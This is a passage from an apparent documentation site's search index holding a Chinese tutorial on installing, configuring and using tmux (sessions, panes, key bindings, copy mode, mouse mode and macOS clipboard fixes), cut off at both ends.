\u98ce\u683c\u7684\u952e\u76d8\u6620\u5c04\uff0c\u66f4\u597d\u7684\u63a5\u53e3\u548c\u6587\u6863\uff0c\u4ee5\u53ca\u66f4\u597d\u7684\u811a\u672c\u63a7\u5236\u3002\u6240\u4ee5\u5efa\u8bae\u4f7f\u7528 Tmux\uff01 \u5b89\u88c5\u4f7f\u7528 \u9996\u5148\u8fdb\u884c\u5b89\u88c5\uff1a brew install tmux # OSX pacman -S tmux # archlinux apt-get install tmux # Ubuntu yum install tmux # Centos \u5b89\u88c5\u597d\u540e\u5c31\u53ef\u4ee5\u542f\u7528\u4e00\u4e2aTmux Session\u4e86\uff1a\uff08\u901a\u8fc7 tmux new -s myname \u53ef\u4ee5\u6307\u5b9aSession\u540d\uff09 tmux \u5728Tmux Session\u4e2d\uff0c\u901a\u8fc7 <prefix>$ \u53ef\u4ee5\u91cd\u547d\u540d\u5f53\u524dSession\u3002\u5176\u4e2d <prefix> \u6307\u7684\u662ftmux\u7684\u524d\u7f00\u952e\uff0c\u6240\u6709tmux\u5feb\u6377\u952e\u90fd\u9700\u8981\u5148\u6309\u524d\u7f00\u952e\u3002\u5b83\u7684\u9ed8\u8ba4\u503c\u662f Ctrl+b \u3002 <prefix>c \u53ef\u4ee5\u521b\u5efa\u65b0\u7684\u7a97\u53e3\uff08Window\uff09\uff0c <prefix>% \u6c34\u5e73\u5206\u5272\u7a97\u53e3\uff08\u5f62\u6210\u4e24\u4e2aPane\uff09\uff0c <prefix>\" \u5782\u76f4\u5206\u5272\u7a97\u53e3\u3002\u9000\u51fa\u5f53\u524dSession\u7684\u5feb\u6377\u952e\u662f <prefix>d \u3002\u7136\u540e\u5728Bash\u4e2d\u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u7684tmux\u670d\u52a1\u4e2d\u6709\u54ea\u4e9bSession\uff1a tmux ls \u7136\u540e\u6839\u636eSession\u7684\u540d\u5b57\u53ef\u4ee5\u518d\u56de\u53bb\uff1a tmux a -t myname (or at, or attach) \u57fa\u672c\u914d\u7f6e \u9ed8\u8ba4\u7684 <prefix> \u662f Ctrl+b \uff0c\u5982\u679c\u4f60\u89c9\u5f97\u4e0d\u597d\u6309\u53ef\u4ee5\u8c03\u6574\u4e3a Ctrl+a \uff0c\u53ea\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6 ~/.tmux.conf \u4e2d\u52a0\u5165\uff1a unbind ^b set -g prefix 'C-a' \u8f7d\u5165\u914d\u7f6e \u4e3a\u4e86\u80fd\u8ba9Tmux\u52a8\u6001\u8f7d\u5165\u914d\u7f6e\u800c\u4e0d\u662f\u91cd\u542f\uff0c\u6211\u4eec\u8bbe\u4e00\u4e2a\u5feb\u6377\u952e <prefix>r \u6765\u91cd\u65b0\u8f7d\u5165\u914d\u7f6e\uff1a bind r source-file ~/.tmux.conf \\; display-message \"Config reloaded\" \u6ce8\u610f\uff0c\u901a\u8fc7 <prefix>r \u91cd\u65b0\u8f7d\u5165\u914d\u7f6e\u5e76\u4e0d\u7b49\u540c\u4e8e\u91cd\u542f\uff0c\u53ea\u662f\u589e\u91cf\u5730\u6267\u884c\u4e86\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u547d\u4ee4\u800c\u5df2\u3002\u5982\u679c\u914d\u7f6e\u672a\u751f\u6548\uff0c\u53ef\u4ee5\u901a\u8fc7 tmux kill-server \u6765\u5f3a\u884c\u5173\u95edTmux\u3002 \u5bfc\u51fa\u914d\u7f6e \u5982\u679c\u4f60\u60f3\u77e5\u9053\u5f53\u524dtmux\u7684\u8bbe\u7f6e\uff0c\u53ef\u901a\u8fc7 tmux show -g \u6765\u67e5\u770b\uff08\u8be5\u547d\u4ee4\u9700\u8981tmux\u6b63\u5728\u8fd0\u884c\uff09\u3002 \u4f60\u53ef\u80fd\u4f1a\u9700\u8981\u628a\u8fd9\u4e9b\u8bbe\u7f6e\u5bfc\u51fa\u4e3a\u6587\u4ef6\uff1a tmux show -g >> current.tmux.conf \u62f7\u8d1d\u7c98\u8d34 \u5728Tmux\u4e2d\u901a\u8fc7 [ \u8fdb\u5165\u62f7\u8d1d\u6a21\u5f0f\uff0c\u6309\u4e0b <space> \u5f00\u59cb\u62f7\u8d1d\u3002\u7136\u540e\u7528Vim/Emacs\u5feb\u6377\u952e\u9009\u62e9\u6587\u672c\uff0c\u6309\u4e0b <Enter> \u62f7\u8d1d\u6240\u9009\u5185\u5bb9\u3002\u7136\u540e\u901a\u8fc7 ] \u8fdb\u884c\u7c98\u8d34\u3002 \u4e0a\u8ff0\u6240\u6709\u5feb\u6377\u952e\u4e2d\uff0c\u53ea\u6709 [ \u548c ] \u9700\u8981\u5148\u6309\u4e0b <prefix> \u3002 \u6211\u4eec\u53ef\u4ee5\u8ba9\u4e0a\u8ff0\u62f7\u8d1d\u5feb\u6377\u952e\u7b26\u5408Vi\u98ce\u683c\uff1a bind Escape copy-mode bind-key -Tcopy-mode-vi 'v' send -X begin-selection bind-key -Tcopy-mode-vi 'y' send -X copy-selection unbind p bind p pasteb setw -g mode-keys vi # Vi\u98ce\u683c\u9009\u62e9\u6587\u672c \u8fd9\u6837\uff0c\u6309\u4e0b <Escape> \u8fdb\u5165\u62f7\u8d1d\u6a21\u5f0f\uff0c v \u8fdb\u884c\u9009\u62e9\uff0c y \u62f7\u8d1d\u6240\u9009\u5185\u5bb9\uff0c p \u8fdb\u884c\u7c98\u8d34\u3002 \u53e6\u5916\u53ea\u8981\u5f00\u542f\u9f20\u6807\u6a21\u5f0f\uff08\u89c1\u4e0b\u6587\uff09\uff0c\u8fd8\u53ef\u4ee5\u7528\u9f20\u6807\u9009\u53d6\u62f7\u8d1d\u6587\u5b57\u3002 \u65e7\u7248\u672c\u4e2d\u5f00\u59cb\u9009\u62e9\u548c\u590d\u5236\u9009\u4e2d\u5feb\u6377\u952e\u7ed1\u5b9a\u65b9\u5f0f\u4e0d\u540c\uff0c\u8bf7\u53c2\u8003 https://github.com/tmux/tmux/issues/592 \u5feb\u6377\u952e \u4e0b\u9762\u5217\u51fa\u4e86\u5728 Tmux \u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u5feb\u6377\u952e\uff0c\u5728\u4e0b\u9762\u7ed9\u51fa\u7684\u6309\u952e\u4e4b\u524d\u9700\u8981\u5148\u6309\u4e0b <prefix> \uff0c \u5982\u679c\u4f60\u6ca1\u6709\u8bbe\u7f6e\u8fc7\u5b83\uff0c\u9ed8\u8ba4\u662f Ctrl+b \u3002 :new<CR> # \u521b\u5efa\u65b0\u7684 Session\uff0c\u5176\u4e2d : \u662f\u8fdb\u5165 Tmux \u547d\u4ee4\u884c\u7684\u5feb\u6377\u952e s # \u5217\u51fa\u6240\u6709 Session\uff0c\u53ef\u901a\u8fc7 j, k, \u56de\u8f66\u5207\u6362 $ # \u4e3a\u5f53\u524d Session \u547d\u540d c # \u521b\u5efa Window <n> # \u5207\u6362\u5230\u7b2c n \u4e2a Window , # \u4e3a\u5f53\u524d Window \u547d\u540d % # \u5782\u76f4\u5207\u5206 Pane \" # \u6c34\u5e73\u5207\u5206 Pane <space> # \u5207\u6362 Pane \u5e03\u5c40 d # detach\uff0c\u9000\u51fa Tmux Session\uff0c\u56de\u5230\u7236\u7ea7 Shell t # \u663e\u793a\u4e00\u4e2a\u65f6\u949f\uff0c:) ? # \u5feb\u6377\u952e\u5e2e\u52a9\u5217\u8868 \u5728 Pane \u4e4b\u95f4\u5207\u6362\uff0c\u6216\u8005\u6539\u53d8 Pane \u5927\u5c0f\uff0c\u5efa\u8bae\u81ea\u5df1\u914d\u7f6e\u5feb\u6377\u952e\u3002\u6bd4\u5982\u628a\u5b83\u914d\u7f6e\u6210 Vim \u98ce\u683c\uff1a bind h select-pane -L # \u5207\u6362\u5230\u5de6\u8fb9\u7684 Pane bind j select-pane -D # \u5207\u6362\u5230\u4e0b\u8fb9\u7684 Pane bind k select-pane -U # \u5207\u6362\u5230\u4e0a\u8fb9\u7684 Pane bind l select-pane -R # \u5207\u6362\u5230\u53f3\u8fb9\u7684 Pane bind L resize-pane -L 10 # \u5411\u5de6\u6269\u5c55 bind R resize-pane -R 10 # \u5411\u53f3\u6269\u5c55 bind K resize-pane -U 5 # \u5411\u4e0a\u6269\u5c55 bind J resize-pane -D 5 # \u5411\u4e0b\u6269\u5c55 \u5b8c\u6574\u7684\u5feb\u6377\u952e\u5217\u8868\u53ef\u4ee5\u53c2\u8003\uff1a https://gist.github.com/MohamedAlaa/2961058 Unicode \u663e\u793a\u95ee\u9898 Tmux \u901a\u8fc7 LC_ALL , LC_CTYPE , LANG \u73af\u5883\u53d8\u91cf\u6765\u5224\u65ad\u662f\u5426\u7ec8\u7aef\u652f\u6301 UTF-8\u3002 \u8fd9\u6837\u7684\u5224\u65ad\u6709\u65f6\u662f\u4e0d\u51c6\u786e\u7684\uff0c\u5bfc\u81f4 Tmux \u4e2d\u65e0\u6cd5\u663e\u793a Unicode\u3002\u89e3\u51b3\u601d\u8def\u6709\u4e24\u4e2a\uff1a \u5728\u542f\u52a8 tmux \u6216 tmux attach \u6240\u5728\u7684 Shell \u4e2d\u6dfb\u52a0 LC_ALL \u73af\u5883\u53d8\u91cf\u3002 \u542f\u52a8 Tmux \u65f6\u589e\u52a0 -u \u53c2\u6570\u53ef\u4ee5\u663e\u5f0f\u5730\u901a\u77e5 tmux \u7ec8\u7aef\u652f\u6301 UTF-8\uff08 man tmux \uff09\u3002 tmux -u \u542f\u7528\u9f20\u6807 Tmux \u548c Vim \u98ce\u683c\u975e\u5e38\u50cf\uff0c\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u9f20\u6807\u6a21\u5f0f\u3002\u4e0b\u9762\u7684\u8bbe\u7f6e\u5f00\u542f\u4e86\u6240\u6709\u9f20\u6807\u529f\u80fd\uff1a \u70b9\u51fb\u9009\u62e9\u7a97\u683c/\u7a97\u53e3\uff0c\u62d6\u52a8\u7a97\u683c\u5927\u5c0f\uff0c\u4ee5\u53ca\u62d6\u52a8\u9f20\u6807\u590d\u5236\u6587\u5b57\u3002 set -g mouse on 2.1 \u4e4b\u524d\u7684\u7248\u672c(\u53d1\u5e03\u4e8e 2015.10.18) \u9700\u8981\u8bbe\u7f6e mode-mouse , mouse-select-pane , mouse-resize-pane , mouse-select-window \u7b494 \u4e2a\u9009\u9879\u6765\u5f00\u542f\u6240\u6709\u9f20\u6807\u529f\u80fd\uff0c\u73b0\u5728\u53ea\u9700\u8981\u8bbe\u7f6e mouse \u9009\u9879\u4e86\u3002 \u4f7f\u7528 tmux -V \u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u5b89\u88c5\u7684 tmux \u7248\u672c\uff0c\u7248\u672c\u66f4\u65b0\u65e5\u5fd7\u89c1 Tmux Changelog \u3002 Attach \u5230\u7528\u6237\u7a7a\u95f4 \u6709\u5199\u7ae5\u978b\u4f1a\u53d1\u73b0\u5728 Tmux \u4e2d\u6267\u884c open , sudo \u7b49\u547d\u4ee4\u4f1a\u6709\u9519\u8bef\u5982\u4e0b\uff1a The window server could not be contacted. open must be run with a user logged in at the console, either as that user or as root. \u6216\u8005 Vim \u533f\u540d\u5bc4\u5b58\u5668 \u4e5f\u8bbf\u95ee\u4e0d\u5230\u7cfb\u7edf\u526a\u5207\u677f\uff0c\u6bd4\u5982\u7c98\u8d34\u65f6\u62a5\u9519\uff1a Nothing in register * \u8fd9\u662f\u56e0\u4e3a Tmux \u4e2d\u7684 Shell \u6ca1\u6709\u8fd0\u884c\u5728 Mac \u7684 GUI Session \u4e2d\uff0c \u53ef\u4ee5\u4f7f\u7528 reattach-to-user-namespace \u5de5\u5177\u6765\u8fdb\u884c Attach\u3002 \u9996\u5148\u5b89\u88c5\u8fd9\u4e00\u5de5\u5177\uff1a brew update brew install reattach-to-user-namespace \u7136\u540e\u5728 .tmux.conf \u4e2d\u914d\u7f6e\u9ed8\u8ba4\u547d\u4ee4\uff1a set -g default-command \"reattach-to-user-namespace -l /usr/local/bin/zsh\" \u8fd9\u91cc\u7684 /usr/local/bin/zsh \u8981\u5bf9\u5e94\u4e8e\u4f60\u7684\u9ed8\u8ba4 Shell \u7684\u8def\u5f84\uff0c\u5982\u679c\u4f60\u6ca1\u505a\u8fc7\u624b\u811a\u7684\u8bdd\uff0c\u5e94\u8be5\u5728 /usr/bin/bash \u3002 \u53ef\u4ee5\u901a\u8fc7 echo $SHELL \u67e5\u770b\u5f53\u524d Shell \u7684\u8def\u5f84\u3002 Session \u5076\u5c14\u4e22\u5931 Tmux \u4e2d Session \u6216 Window \u4e22\u5931\u53ef\u80fd\u7684\u539f\u56e0\u6709\u5f88\u591a\uff0c\u9700\u8981\u4ed4\u7ec6\u6392\u67e5\u3002\u68c0\u67e5 tmux \u65e5\u5fd7\uff0c\u4ee5\u53ca\u68c0\u67e5 Shell \u7684\u5404\u7ea7\u914d\u7f6e \u3002 \u6bd4\u5982 Shell \u7684 TMOUT \u73af\u5883\u53d8\u91cf\u4f1a\u8ba9\u8d85\u65f6\u540e\u7684 Shell \u81ea\u52a8\u9000\u51fa\uff0c\u6700\u7ec8\u5bfc\u81f4 Session \u5173\u95ed\u3002 \u6bd4\u5982\u4e34\u65f6\u6587\u4ef6\u5939\u88ab\u6e05\u7a7a\u5bfc\u81f4 socket \u4e22\u5931\uff0c\u53c2\u8003\uff1a https://community.webfaction.com/questions/9462/tmux-session-lost-in-unknown-pts-cause-and-possible-solution \u65b0 Shell \u7684\u5de5\u4f5c\u76ee\u5f55 \u6211\u4eec\u53d1\u73b0\u5f53\u6253\u5f00\u65b0\u7a97\u683c\u65f6 Shell \u4ecd\u7136\u5728Home\u76ee\u5f55\u3002 \u8fd9\u662f Tmux \u7684\u9ed8\u8ba4\u884c\u4e3a\uff0c\u53ef\u4ee5\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u8bbe\u7f6e\u4e3a\u5f53\u524d Shell \u6240\u5728\u76ee\u5f55\uff1a bind '\"' split-window -c '#{pane_current_path}' bind '%' split-window -h -c '#{pane_current_path}' \u6269\u5c55\u9605\u8bfb TMUX \u4e0e Screen \u7684\u533a\u522b\uff1a http://unix.stackexchange.com/questions/549/tmux-vs-gnu-screen Cheetsheet: https://gist.github.com/MohamedAlaa/2961058 Wikipedia\uff1a https://en.wikipedia.org/wiki/Tmux Vim \u63a7\u5236 Tmux\uff1a https://github.com/benmills/vimux \u539f\u6587\u94fe\u63a5\uff1a https://harttle.land/2015/11/06/tmux-startup.html","title":"\u4f18\u96c5\u5730\u4f7f\u7528\u547d\u4ee4\u884c\uff1aTmux \u7ec8\u7aef\u590d\u7528"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#tmux","text":"\u4f60\u662f\u5426\u66fe\u7ecf\u5f00\u8fc7\u4e00\u5927\u5806\u7684 Terminal\uff1f\u6709\u6ca1\u6709\u628a\u5b83\u4eec\u90fd\u4fdd\u5b58\u4e0b\u6765\u7684\u51b2\u52a8\uff1f Tmux \u7684Session\u5c31\u662f\u505a\u8fd9\u4ef6\u4e8b\u60c5\u7684\uff01 \u4f60\u53ef\u4ee5\u968f\u65f6\u9000\u51fa\u6216\u8005\u8fdb\u5165\u4efb\u4f55\u4e00\u4e2a Session\u3002\u6bcf\u4e2a Session \u6709\u82e5\u5e72\u4e2a Window\uff0c\u6bcf\u4e2a Window \u53c8\u53ef\u4ee5\u5206\u6210\u591a\u4e2a\u7a97\u683c\uff08Pane\uff09\u3002 \u6781\u5927\u5730\u6ee1\u8db3 Terminal \u7528\u6237\u7684\u9700\u6c42\u3002 \u6b64\u5916\u5373\u4f7f iTerm/Terminal/Konsole \u610f\u5916\u5173\u95ed\u4e5f\u6ca1\u5173\u7cfb\uff0c\u56e0\u4e3a Session \u5b8c\u5168\u4fdd\u5b58\u5728 Tmux Server \u4e2d\u3002 \u518d\u6b21\u6253\u5f00 Terminal \u65f6\u53ea\u9700 tmux attach \u4fbf\u53ef\u56de\u5230\u4f60\u7684\u5de5\u4f5c\u533a\uff0c\u5c31\u50cf\u4ece\u672a\u9000\u51fa\u8fc7\u4e00\u6837\u3002 \u5982\u679c\u5e0c\u671b\u91cd\u542f\u7535\u8111\u540e\u4ecd\u7136\u751f\u6548\uff0c\u4f60\u53ef\u80fd\u9700\u8981 \u52a8\u624b\u5199\u811a\u672c \u6216\u8005 \u4f7f\u7528\u63d2\u4ef6 \u3002","title":"\u4f18\u96c5\u5730\u4f7f\u7528\u547d\u4ee4\u884c\uff1aTmux \u7ec8\u7aef\u590d\u7528"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#tmux_1","text":"Tmux \u662f\u4e00\u4e2a BSD \u534f\u8bae\u53d1\u5e03\u7684\u7ec8\u7aef\u590d\u7528\u8f6f\u4ef6\uff0c\u7528\u6765\u5728\u670d\u52a1\u5668\u7aef\u6258\u7ba1\u540c\u65f6\u8fd0\u884c\u7684 Shell\u3002\u90a3\u4e48 Tmux \u7528\u8d77\u6765\u662f\u600e\u6837\u7684\u5462\uff1f\u770b\u56fe\uff1a Tmux \u6700\u7ecf\u5178\u7684\u4f7f\u7528\u573a\u666f\u4fbf\u662f\u7528 Tmux+Vim \u6765\u505a\u4e00\u4e2aIDE\uff0c\u5176\u4e2dVim\u90e8\u5206\u7684\u914d\u7f6e\u8fc7\u7a0b\u8bb0\u5f55\u5728\u4e86 \u8fd9\u91cc \u3002 \u672c\u6587\u4ecb\u7ecdTmux\u7684\u5b89\u88c5\u914d\u7f6e\uff0c\u4ee5\u53ca\u5e38\u89c1\u95ee\u9898\u7684\u89e3\u51b3\u65b9\u5f0f\u3002","title":"\u4ec0\u4e48\u662f Tmux"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#iterm-tmux","text":"iTerm\u662f\u4e00\u4e2aGUI\u8f6f\u4ef6\uff0c\u5b83\u7684\u7a97\u683c\u53ea\u662f\u7a97\u683c\u800c\u5df2\uff01\u800cTmux\u662f\u7ec8\u7aef\u590d\u7528\uff0c\u5728\u4e00\u4e2a\u547d\u4ee4\u884c\u7a97\u53e3\u4e2d\u4e0d\u4ec5\u53ef\u4ee5\u663e\u793a\u591a\u4e2aShell\u7684\u5185\u5bb9\uff0c\u800c\u4e14\u53ef\u4ee5\u4fdd\u6301\u591a\u4e2a\u4f1a\u8bdd\u3002 \u6700\u91cd\u8981\u7684\u662f\uff1aTmux\u548cVim\u4e00\u6837\u5c5e\u4e8e\u5b57\u7b26\u7ec8\u7aef\u8f6f\u4ef6\uff0c\u4e0d\u9700\u8981\u4efb\u4f55GUI\u7684\u652f\u6301\uff0c\u5728\u8fdc\u7a0b\u767b\u5f55\u65f6\u5c24\u5176\u6709\u7528\u3002 \u7ec8\u7aef\u548c Shell \u6709\u4ec0\u4e48\u533a\u522b\uff1f\u8bf7\u53c2\u8003 Shell\u7684\u76f8\u5173\u6982\u5ff5\u548c\u914d\u7f6e\u65b9\u6cd5 \u3002","title":"iTerm \u7684\u7a97\u683c\u548c Tmux \u6709\u4ec0\u4e48\u533a\u522b\uff1f"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#tmux-screen","text":"\u8fd9\u4e24\u4e2a\u90fd\u662f\u505a\u7ec8\u7aef\u590d\u7528\u7684\uff0c\u6211\u5728\u963f\u91cc\u4e91 ECS \u4e0a \u642d\u5efaNode.js API\u670d\u52a1\u5668 \u65f6\u7528\u8fc7 screen \uff0c\u5b83\u662f GNU \u8f6f\u4ef6\uff0c\u800c Tmux \u662f BSD \u7684\u534f\u8bae\u3002 \u5b83\u4eec\u6700\u4e3b\u8981\u7684\u533a\u522b\u662f Tmux \u652f\u6301 Vi/Emacs \u98ce\u683c\u7684\u952e\u76d8\u6620\u5c04\uff0c\u66f4\u597d\u7684\u63a5\u53e3\u548c\u6587\u6863\uff0c\u4ee5\u53ca\u66f4\u597d\u7684\u811a\u672c\u63a7\u5236\u3002\u6240\u4ee5\u5efa\u8bae\u4f7f\u7528 Tmux\uff01","title":"Tmux \u548c screen \u6709\u4ec0\u4e48\u533a\u522b\uff1f"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#_1","text":"\u9996\u5148\u8fdb\u884c\u5b89\u88c5\uff1a brew install tmux # OSX pacman -S tmux # archlinux apt-get install tmux # Ubuntu yum install tmux # Centos \u5b89\u88c5\u597d\u540e\u5c31\u53ef\u4ee5\u542f\u7528\u4e00\u4e2aTmux Session\u4e86\uff1a\uff08\u901a\u8fc7 tmux new -s myname \u53ef\u4ee5\u6307\u5b9aSession\u540d\uff09 tmux \u5728Tmux Session\u4e2d\uff0c\u901a\u8fc7 <prefix>$ \u53ef\u4ee5\u91cd\u547d\u540d\u5f53\u524dSession\u3002\u5176\u4e2d <prefix> \u6307\u7684\u662ftmux\u7684\u524d\u7f00\u952e\uff0c\u6240\u6709tmux\u5feb\u6377\u952e\u90fd\u9700\u8981\u5148\u6309\u524d\u7f00\u952e\u3002\u5b83\u7684\u9ed8\u8ba4\u503c\u662f Ctrl+b \u3002 <prefix>c \u53ef\u4ee5\u521b\u5efa\u65b0\u7684\u7a97\u53e3\uff08Window\uff09\uff0c <prefix>% \u6c34\u5e73\u5206\u5272\u7a97\u53e3\uff08\u5f62\u6210\u4e24\u4e2aPane\uff09\uff0c <prefix>\" \u5782\u76f4\u5206\u5272\u7a97\u53e3\u3002\u9000\u51fa\u5f53\u524dSession\u7684\u5feb\u6377\u952e\u662f <prefix>d \u3002\u7136\u540e\u5728Bash\u4e2d\u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u7684tmux\u670d\u52a1\u4e2d\u6709\u54ea\u4e9bSession\uff1a tmux ls \u7136\u540e\u6839\u636eSession\u7684\u540d\u5b57\u53ef\u4ee5\u518d\u56de\u53bb\uff1a tmux a -t myname (or at, or attach)","title":"\u5b89\u88c5\u4f7f\u7528"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#_2","text":"\u9ed8\u8ba4\u7684 <prefix> \u662f Ctrl+b \uff0c\u5982\u679c\u4f60\u89c9\u5f97\u4e0d\u597d\u6309\u53ef\u4ee5\u8c03\u6574\u4e3a Ctrl+a \uff0c\u53ea\u9700\u8981\u5728\u914d\u7f6e\u6587\u4ef6 ~/.tmux.conf \u4e2d\u52a0\u5165\uff1a unbind ^b set -g prefix 'C-a'","title":"\u57fa\u672c\u914d\u7f6e"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#_3","text":"\u4e3a\u4e86\u80fd\u8ba9Tmux\u52a8\u6001\u8f7d\u5165\u914d\u7f6e\u800c\u4e0d\u662f\u91cd\u542f\uff0c\u6211\u4eec\u8bbe\u4e00\u4e2a\u5feb\u6377\u952e <prefix>r \u6765\u91cd\u65b0\u8f7d\u5165\u914d\u7f6e\uff1a bind r source-file ~/.tmux.conf \\; display-message \"Config reloaded\" \u6ce8\u610f\uff0c\u901a\u8fc7 <prefix>r \u91cd\u65b0\u8f7d\u5165\u914d\u7f6e\u5e76\u4e0d\u7b49\u540c\u4e8e\u91cd\u542f\uff0c\u53ea\u662f\u589e\u91cf\u5730\u6267\u884c\u4e86\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u547d\u4ee4\u800c\u5df2\u3002\u5982\u679c\u914d\u7f6e\u672a\u751f\u6548\uff0c\u53ef\u4ee5\u901a\u8fc7 tmux kill-server \u6765\u5f3a\u884c\u5173\u95edTmux\u3002","title":"\u8f7d\u5165\u914d\u7f6e"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#_4","text":"\u5982\u679c\u4f60\u60f3\u77e5\u9053\u5f53\u524dtmux\u7684\u8bbe\u7f6e\uff0c\u53ef\u901a\u8fc7 tmux show -g \u6765\u67e5\u770b\uff08\u8be5\u547d\u4ee4\u9700\u8981tmux\u6b63\u5728\u8fd0\u884c\uff09\u3002 \u4f60\u53ef\u80fd\u4f1a\u9700\u8981\u628a\u8fd9\u4e9b\u8bbe\u7f6e\u5bfc\u51fa\u4e3a\u6587\u4ef6\uff1a tmux show -g >> current.tmux.conf","title":"\u5bfc\u51fa\u914d\u7f6e"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#_5","text":"\u5728Tmux\u4e2d\u901a\u8fc7 [ \u8fdb\u5165\u62f7\u8d1d\u6a21\u5f0f\uff0c\u6309\u4e0b <space> \u5f00\u59cb\u62f7\u8d1d\u3002\u7136\u540e\u7528Vim/Emacs\u5feb\u6377\u952e\u9009\u62e9\u6587\u672c\uff0c\u6309\u4e0b <Enter> \u62f7\u8d1d\u6240\u9009\u5185\u5bb9\u3002\u7136\u540e\u901a\u8fc7 ] \u8fdb\u884c\u7c98\u8d34\u3002 \u4e0a\u8ff0\u6240\u6709\u5feb\u6377\u952e\u4e2d\uff0c\u53ea\u6709 [ \u548c ] \u9700\u8981\u5148\u6309\u4e0b <prefix> \u3002 \u6211\u4eec\u53ef\u4ee5\u8ba9\u4e0a\u8ff0\u62f7\u8d1d\u5feb\u6377\u952e\u7b26\u5408Vi\u98ce\u683c\uff1a bind Escape copy-mode bind-key -Tcopy-mode-vi 'v' send -X begin-selection bind-key -Tcopy-mode-vi 'y' send -X copy-selection unbind p bind p pasteb setw -g mode-keys vi # Vi\u98ce\u683c\u9009\u62e9\u6587\u672c \u8fd9\u6837\uff0c\u6309\u4e0b <Escape> \u8fdb\u5165\u62f7\u8d1d\u6a21\u5f0f\uff0c v \u8fdb\u884c\u9009\u62e9\uff0c y \u62f7\u8d1d\u6240\u9009\u5185\u5bb9\uff0c p \u8fdb\u884c\u7c98\u8d34\u3002 \u53e6\u5916\u53ea\u8981\u5f00\u542f\u9f20\u6807\u6a21\u5f0f\uff08\u89c1\u4e0b\u6587\uff09\uff0c\u8fd8\u53ef\u4ee5\u7528\u9f20\u6807\u9009\u53d6\u62f7\u8d1d\u6587\u5b57\u3002 \u65e7\u7248\u672c\u4e2d\u5f00\u59cb\u9009\u62e9\u548c\u590d\u5236\u9009\u4e2d\u5feb\u6377\u952e\u7ed1\u5b9a\u65b9\u5f0f\u4e0d\u540c\uff0c\u8bf7\u53c2\u8003 https://github.com/tmux/tmux/issues/592","title":"\u62f7\u8d1d\u7c98\u8d34"},{"location":"Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/#_6","text":"\u4e0b\u9762\u5217\u51fa\u4e86\u5728 Tmux \u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u5feb\u6377\u952e\uff0c\u5728\u4e0b\u9762\u7ed9\u51fa\u7684\u6309\u952e\u4e4b\u524d\u9700\u8981\u5148\u6309\u4e0b <prefix> \uff0c \u5982\u679c\u4f60\u6ca1\u6709\u8bbe\u7f6e\u8fc7\u5b83\uff0c\u9ed8\u8ba4\u662f Ctrl+b \u3002 :new<CR> # \u521b\u5efa\u65b0\u7684 Session\uff0c\u5176\u4e2d : \u662f\u8fdb\u5165 Tmux \u547d\u4ee4\u884c\u7684\u5feb\u6377\u952e s # \u5217\u51fa\u6240\u6709 Session\uff0c\u53ef\u901a\u8fc7 j, k, \u56de\u8f66\u5207\u6362 $ # \u4e3a\u5f53\u524d Session \u547d\u540d c # \u521b\u5efa Window <n> # \u5207\u6362\u5230\u7b2c n \u4e2a Window , # \u4e3a\u5f53\u524d Window \u547d\u540d % # \u5782\u76f4\u5207\u5206 Pane \" # \u6c34\u5e73\u5207\u5206 Pane <space> # \u5207\u6362 Pane \u5e03\u5c40 d # detach\uff0c\u9000\u51fa Tmux Session\uff0c\u56de\u5230\u7236\u7ea7 Shell t # \u663e\u793a\u4e00\u4e2a\u65f6\u949f\uff0c:) ? # \u5feb\u6377\u952e\u5e2e\u52a9\u5217\u8868 \u5728 Pane \u4e4b\u95f4\u5207\u6362\uff0c\u6216\u8005\u6539\u53d8 Pane 